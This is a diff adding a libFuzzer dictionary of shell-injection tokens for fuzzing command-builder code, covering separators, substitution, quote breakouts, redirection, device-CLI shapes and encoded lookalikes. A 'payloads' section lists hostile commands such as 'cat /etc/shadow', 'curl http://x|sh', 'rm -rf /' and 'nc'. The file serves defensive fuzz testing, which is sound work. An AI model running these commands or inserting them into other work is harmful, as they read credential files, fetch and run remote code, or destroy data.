@@ -1,0 +1,65 @@
+# libFuzzer dictionary for command builders.
+#
+# Without one, libFuzzer must discover `$(` by mutating bytes at random — it
+# will not, in the 30 seconds a nightly run gives each target. These are the
+# tokens that make a builder's output mean something other than intended, so
+# they are exactly the ones a builder fuzzer needs handed to it.
+#
+# Use: cargo +nightly fuzz run <target> -- -dict=fuzz/dicts/shell.dict
+
+# Command separators and chaining
+semicolon=";"
+ampersand="&"
+double_amp="&&"
+pipe="|"
+double_pipe="||"
+newline="\x0a"
+carriage_return="\x0d"
+
+# Substitution
+dollar_paren="$("
+backtick="`"
+dollar_brace="${"
+close_paren=")"
+close_brace="}"
+
+# Redirection
+redirect_out=">"
+redirect_in="<"
+append=">>"
+here_doc="<<"
+fd_redirect="2>&1"
+devnull="/dev/null"
+
+# Quoting — the shapes that break out of a quoted context
+single_quote="'"
+double_quote="\""
+backslash="\\"
+quote_escape="'\\''"
+end_single="';"
+
+# Globbing and expansion
+star="*"
+question="?"
+bracket="["
+tilde="~"
+
+# Payloads a real attempt would carry
+id_cmd="id"
+whoami="whoami"
+cat_shadow="cat /etc/shadow"
+curl_pipe="curl http://x|sh"
+rm_rf="rm -rf /"
+nc="nc "
+
+# Device-CLI shapes (network equipment is not a POSIX shell)
+cisco_config="configure terminal"
+junos_set="set "
+mikrotik_cmd="/system"
+cli_pipe_section="| section"
+
+# Percent-encoded and unicode lookalikes that a naive filter misses
+pct_semicolon="%3B"
+pct_amp="%26"
+fullwidth_semicolon="\xef\xbc\x9b"
+nul="\x00"
